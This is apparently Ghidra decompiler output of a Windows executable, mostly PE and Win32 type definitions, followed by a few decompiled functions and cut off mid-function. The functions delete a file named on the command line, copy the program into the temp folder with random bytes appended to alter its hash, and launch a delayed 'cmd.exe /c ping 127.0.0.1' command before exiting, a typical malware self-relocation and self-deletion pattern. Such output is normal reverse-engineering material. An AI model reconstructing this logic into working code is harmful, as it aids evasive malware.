typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _SYSTEM_INFO _SYSTEM_INFO, *P_SYSTEM_INFO;

typedef struct _SYSTEM_INFO *LPSYSTEM_INFO;

typedef union _union_530 _union_530, *P_union_530;

typedef ulong DWORD;

typedef void *LPVOID;

typedef ulong ULONG_PTR;

typedef ULONG_PTR DWORD_PTR;

typedef ushort WORD;

typedef struct _struct_531 _struct_531, *P_struct_531;

struct _struct_531 {
    WORD wProcessorArchitecture;
    WORD wReserved;
};

union _union_530 {
    DWORD dwOemId;
    struct _struct_531 s;
};

struct _SYSTEM_INFO {
    union _union_530 u;
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef uchar BYTE;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _MEMORY_BASIC_INFORMATION _MEMORY_BASIC_INFORMATION, *P_MEMORY_BASIC_INFORMATION;

typedef ULONG_PTR SIZE_T;

struct _MEMORY_BASIC_INFORMATION {
    PVOID BaseAddress;
    PVOID AllocationBase;
    DWORD AllocationProtect;
    SIZE_T RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
};

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef CHAR *LPCSTR;

typedef struct _MEMORY_BASIC_INFORMATION *PMEMORY_BASIC_INFORMATION;

typedef long LONG;

typedef LONG *PLONG;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef struct _OSVERSIONINFOA *LPOSVERSIONINFOA;

typedef CONTEXT *PCONTEXT;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef long clock_t;

typedef uint UINT_PTR;

typedef long LONG_PTR;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct HICON__ HICON__, *PHICON__;

struct HICON__ {
    int unused;
};

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

struct HDC__ {
    int unused;
};

typedef struct tagRECT tagRECT, *PtagRECT;

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

typedef UINT_PTR WPARAM;

typedef DWORD *LPDWORD;

typedef struct HMENU__ HMENU__, *PHMENU__;

struct HMENU__ {
    int unused;
};

typedef LONG_PTR LRESULT;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef DWORD *PDWORD;

typedef struct tagRECT *LPRECT;

typedef LONG_PTR LPARAM;

typedef HANDLE HGLOBAL;

typedef struct HICON__ *HICON;

typedef struct HINSTANCE__ *HINSTANCE;

typedef void *LPCVOID;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

struct HWND__ {
    int unused;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

typedef struct HRSRC__ *HRSRC;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef uint UINT;

typedef struct HMENU__ *HMENU;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_6 IMAGE_RESOURCE_DIR_STRING_U_6, *PIMAGE_RESOURCE_DIR_STRING_U_6;

struct IMAGE_RESOURCE_DIR_STRING_U_6 {
    word Length;
    wchar16 NameString[3];
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_42 IMAGE_RESOURCE_DIR_STRING_U_42, *PIMAGE_RESOURCE_DIR_STRING_U_42;

struct IMAGE_RESOURCE_DIR_STRING_U_42 {
    word Length;
    wchar16 NameString[21];
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_34 IMAGE_RESOURCE_DIR_STRING_U_34, *PIMAGE_RESOURCE_DIR_STRING_U_34;

struct IMAGE_RESOURCE_DIR_STRING_U_34 {
    word Length;
    wchar16 NameString[17];
};

typedef void (*PMFN)(void *);

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef struct PMD PMD, *PPMD;

typedef int ptrdiff_t;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s_CatchableType {
    uint properties;
    struct TypeDescriptor *pType;
    struct PMD thisDisplacement;
    int sizeOrOffset;
    PMFN copyFunction;
};

struct TypeDescriptor {
    DWORD hash;
    void *spare;
    char name[0];
};

typedef struct _s_CatchableType CatchableType;

typedef struct _s_CatchableTypeArray _s_CatchableTypeArray, *P_s_CatchableTypeArray;

typedef struct _s_CatchableTypeArray CatchableTypeArray;

struct _s_CatchableTypeArray {
    int nCatchableTypes;
    CatchableType *arrayOfCatchableTypes[0];
};

typedef struct _s_ThrowInfo _s_ThrowInfo, *P_s_ThrowInfo;

typedef struct _s_ThrowInfo ThrowInfo;

struct _s_ThrowInfo {
    uint attributes;
    PMFN pmfnUnwind;
    int (*pForwardCompat)(void);
    CatchableTypeArray *pCatchableTypeArray;
};

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Structure
};

typedef struct CRuntimeClass CRuntimeClass, *PCRuntimeClass;

struct CRuntimeClass { // PlaceHolder Structure
};

typedef struct CPtrArray CPtrArray, *PCPtrArray;

struct CPtrArray { // PlaceHolder Structure
};

typedef struct CWinApp CWinApp, *PCWinApp;

struct CWinApp { // PlaceHolder Structure
};

typedef struct CWinThread CWinThread, *PCWinThread;

struct CWinThread { // PlaceHolder Structure
};

typedef struct AFX_MODULE_STATE AFX_MODULE_STATE, *PAFX_MODULE_STATE;

struct AFX_MODULE_STATE { // PlaceHolder Structure
};

typedef struct CDocument CDocument, *PCDocument;

struct CDocument { // PlaceHolder Structure
};

typedef struct CScrollBar CScrollBar, *PCScrollBar;

struct CScrollBar { // PlaceHolder Structure
};

typedef struct AFX_OLECMDMAP AFX_OLECMDMAP, *PAFX_OLECMDMAP;

struct AFX_OLECMDMAP { // PlaceHolder Structure
};

typedef struct CTypeLibCache CTypeLibCache, *PCTypeLibCache;

struct CTypeLibCache { // PlaceHolder Structure
};

typedef struct CMenu CMenu, *PCMenu;

struct CMenu { // PlaceHolder Structure
};

typedef struct _GUID _GUID, *P_GUID;

struct _GUID { // PlaceHolder Structure
};

typedef struct CDataExchange CDataExchange, *PCDataExchange;

struct CDataExchange { // PlaceHolder Structure
};

typedef struct AFX_EVENTSINKMAP AFX_EVENTSINKMAP, *PAFX_EVENTSINKMAP;

struct AFX_EVENTSINKMAP { // PlaceHolder Structure
};

typedef struct COccManager COccManager, *PCOccManager;

struct COccManager { // PlaceHolder Structure
};

typedef struct tagTOOLINFOA tagTOOLINFOA, *PtagTOOLINFOA;

struct tagTOOLINFOA { // PlaceHolder Structure
};

typedef struct AFX_CMDHANDLERINFO AFX_CMDHANDLERINFO, *PAFX_CMDHANDLERINFO;

struct AFX_CMDHANDLERINFO { // PlaceHolder Structure
};

typedef struct AFX_CONNECTIONMAP AFX_CONNECTIONMAP, *PAFX_CONNECTIONMAP;

struct AFX_CONNECTIONMAP { // PlaceHolder Structure
};

typedef struct IUnknown IUnknown, *PIUnknown;

struct IUnknown { // PlaceHolder Structure
};

typedef struct CDialog CDialog, *PCDialog;

struct CDialog { // PlaceHolder Structure
};

typedef struct ITypeLib ITypeLib, *PITypeLib;

struct ITypeLib { // PlaceHolder Structure
};

typedef struct COleControlSite COleControlSite, *PCOleControlSite;

struct COleControlSite { // PlaceHolder Structure
};

typedef struct tagVARIANT tagVARIANT, *PtagVARIANT;

struct tagVARIANT { // PlaceHolder Structure
};

typedef struct CWnd CWnd, *PCWnd;

struct CWnd { // PlaceHolder Structure
};

typedef struct CCreateContext CCreateContext, *PCCreateContext;

struct CCreateContext { // PlaceHolder Structure
};

typedef struct CException CException, *PCException;

struct CException { // PlaceHolder Structure
};

typedef struct CFont CFont, *PCFont;

struct CFont { // PlaceHolder Structure
};

typedef struct tagMSG tagMSG, *PtagMSG;

struct tagMSG { // PlaceHolder Structure
};

typedef struct CCmdTarget CCmdTarget, *PCCmdTarget;

struct CCmdTarget { // PlaceHolder Structure
};

typedef struct IConnectionPoint IConnectionPoint, *PIConnectionPoint;

struct IConnectionPoint { // PlaceHolder Structure
};

typedef struct AFX_DISPMAP AFX_DISPMAP, *PAFX_DISPMAP;

struct AFX_DISPMAP { // PlaceHolder Structure
};

typedef struct _AFX_OCC_DIALOG_INFO _AFX_OCC_DIALOG_INFO, *P_AFX_OCC_DIALOG_INFO;

struct _AFX_OCC_DIALOG_INFO { // PlaceHolder Structure
};

typedef struct CString CString, *PCString;

struct CString { // PlaceHolder Structure
};

typedef struct AFX_INTERFACEMAP AFX_INTERFACEMAP, *PAFX_INTERFACEMAP;

struct AFX_INTERFACEMAP { // PlaceHolder Structure
};

typedef struct tagCREATESTRUCTA tagCREATESTRUCTA, *PtagCREATESTRUCTA;

struct tagCREATESTRUCTA { // PlaceHolder Structure
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Structure
};

typedef struct AFX_MSGMAP AFX_MSGMAP, *PAFX_MSGMAP;

struct AFX_MSGMAP { // PlaceHolder Structure
};

typedef struct CPaintDC CPaintDC, *PCPaintDC;

struct CPaintDC { // PlaceHolder Structure
};

typedef struct CPoint CPoint, *PCPoint;

struct CPoint { // PlaceHolder Structure
};

typedef struct out_of_range out_of_range, *Pout_of_range;

struct out_of_range { // PlaceHolder Structure
};

typedef struct bad_alloc bad_alloc, *Pbad_alloc;

struct bad_alloc { // PlaceHolder Structure
};

typedef struct allocator<char> allocator<char>, *Pallocator<char>;

struct allocator<char> { // PlaceHolder Structure
};

typedef struct logic_error logic_error, *Plogic_error;

struct logic_error { // PlaceHolder Structure
};

typedef struct basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>, *Pbasic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>;

struct basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> { // PlaceHolder Structure
};

typedef struct _Lockit _Lockit, *P_Lockit;

struct _Lockit { // PlaceHolder Structure
};

typedef int (*_onexit_t)(void);

typedef longlong __time64_t;

typedef uint size_t;

typedef __time64_t time_t;

typedef ushort wctype_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};




undefined4 * __fastcall FUN_0040100c(undefined4 *param_1)

{
  int *piVar1;
  
  CWinApp::CWinApp((CWinApp *)param_1,(char *)0x0);
  *param_1 = &DAT_00417368;
  piVar1 = (int *)__p___argv();
  DeleteFileA(*(LPCSTR *)(*piVar1 + 4));
  return param_1;
}



CWinApp * __thiscall FUN_00401031(void *this,byte param_1)

{
  CWinApp::~CWinApp((CWinApp *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CWinApp *)this;
}



void __thiscall CWinApp::~CWinApp(CWinApp *this)

{
                    // WARNING: Could not recover jumptable at 0x004151f0. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CWinApp(this);
  return;
}



void FUN_0040107c(void)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 local_20;
  
  puVar2 = (undefined4 *)&DAT_0041c030;
  puVar3 = &local_20;
  for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  *(undefined *)((int)puVar3 + 2) = *(undefined *)((int)puVar2 + 2);
  GetTickCount();
  FUN_00452b18();
  return;
}



undefined4 __cdecl FUN_004010df(int param_1,LPCSTR param_2,int *param_3)

{
  int *piVar1;
  undefined4 uVar2;
  int iVar3;
  undefined1 unaff_BP;
  undefined4 *puVar4;
  undefined local_1008;
  undefined4 local_1007;
  undefined4 uStackY_2c;
  LPCSTR lpFileName;
  DWORD dwDesiredAccess;
  DWORD dwShareMode;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  DWORD dwCreationDisposition;
  DWORD dwFlagsAndAttributes;
  HANDLE pvVar5;
  
  FUN_00415390(unaff_BP);
  local_1008 = 0;
  pvVar5 = (HANDLE)0x0;
  puVar4 = &local_1007;
  for (iVar3 = 0x3ff; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  dwFlagsAndAttributes = 0x80;
  dwCreationDisposition = 3;
  lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
  dwShareMode = 0;
  *(undefined2 *)puVar4 = 0;
  dwDesiredAccess = 0x80000000;
  lpFileName = param_2;
  *(undefined *)((int)puVar4 + 2) = 0;
  uStackY_2c = 0x401120;
  pvVar5 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                       dwCreationDisposition,dwFlagsAndAttributes,pvVar5);
  piVar1 = param_3;
  if (pvVar5 == (HANDLE)0xffffffff) {
    uVar2 = 0;
  }
  else {
    while( true ) {
      param_2 = (LPCSTR)0x0;
      memset(&local_1008,0,0x1000);
      ReadFile(pvVar5,&local_1008,0x1000,(LPDWORD)&param_2,(LPOVERLAPPED)0x0);
      if (param_2 == (LPCSTR)0x0) break;
      memcpy((void *)(*piVar1 + param_1),&local_1008,(size_t)param_2);
      *piVar1 = (int)(param_2 + *piVar1);
    }
    CloseHandle(pvVar5);
    uVar2 = 1;
  }
  return uVar2;
}



void FUN_00401194(void)

{
  char cVar1;
  char *_Dst;
  undefined4 *puVar2;
  DWORD DVar3;
  void *pvVar4;
  int iVar5;
  time_t tVar6;
  DWORD *pDVar7;
  CHAR local_73c;
  undefined4 local_73b;
  char local_33c;
  undefined4 local_33b;
  CHAR local_238;
  undefined4 local_237;
  CHAR local_134;
  undefined4 local_133;
  undefined local_30;
  undefined4 local_2f;
  undefined4 uStack_2b;
  undefined4 uStack_27;
  undefined2 uStack_23;
  undefined uStack_21;
  DWORD local_20;
  void *local_1c;
  uint local_18;
  char *local_14;
  HANDLE local_10;
  DWORD local_c;
  uint local_8;
  
  _Dst = (char *)operator_new(0x100000);
  local_14 = _Dst;
  memset(_Dst,0,0x100000);
  pDVar7 = &local_c;
  local_c = 0;
  puVar2 = (undefined4 *)__p___argv();
  FUN_004010df((int)_Dst,*(LPCSTR *)*puVar2,(int *)pDVar7);
  cVar1 = *_Dst;
  while (cVar1 != 'M') {
    pDVar7 = &local_c;
    puVar2 = (undefined4 *)__p___argv();
    FUN_004010df((int)_Dst,*(LPCSTR *)*puVar2,(int *)pDVar7);
    Sleep(100);
    cVar1 = *_Dst;
  }
  local_134 = '\0';
  local_30 = 0;
  puVar2 = &local_133;
  for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  local_2f = 0;
  uStack_2b = 0;
  uStack_27 = 0;
  uStack_23 = 0;
  uStack_21 = 0;
  FUN_0040107c();
  DVar3 = GetTickCount();
  local_8 = DVar3 & 0x1ff;
  local_238 = '\0';
  puVar2 = &local_237;
  for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  GetTempPathA(0x104,&local_238);
  wsprintfA(&local_134,s__s__s_exe_0041c074,&local_238,&local_30);
  local_10 = CreateFileA(&local_134,0x40000000,2,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  tVar6 = time((time_t *)0x0);
  srand((uint)tVar6);
  pvVar4 = operator_new(local_8);
  local_18 = 0;
  local_1c = pvVar4;
  if (local_8 != 0) {
    do {
      iVar5 = rand();
      *(char *)(local_18 + (int)pvVar4) = (char)(iVar5 % 0xff) - (char)local_18;
      local_18 = local_18 + 1;
    } while (local_18 < local_8);
  }
  Sleep(100);
  WriteFile(local_10,local_14,local_c,&local_20,(LPOVERLAPPED)0x0);
  Sleep(100);
  WriteFile(local_10,local_1c,local_8,&local_20,(LPOVERLAPPED)0x0);
  CloseHandle(local_10);
  operator_delete(local_1c);
  operator_delete(local_14);
  local_73c = '\0';
  puVar2 = &local_73b;
  for (iVar5 = 0xff; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  local_33c = '\0';
  puVar2 = &local_33b;
  for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  puVar2 = (undefined4 *)__p___argv();
  strcpy(&local_33c,*(char **)*puVar2);
  wsprintfA(&local_73c,s_cmd_exe__c_ping_127_0_0_1__n_2___0041c04c,&local_134,&local_33c);
  WinExec(&local_73c,0);
  Sleep(500);
                    // WARNING: Subroutine does not return
  ExitProcess(0xffffffff);
}



undefined4 FUN_004013bc(void)

{
  byte bVar1;
  byte bVar2;
  HANDLE hFile;
  HRSRC hResInfo;
  byte *hResData;
  undefined *puVar3;
  LPVOID _Src;
  BOOL BVar4;
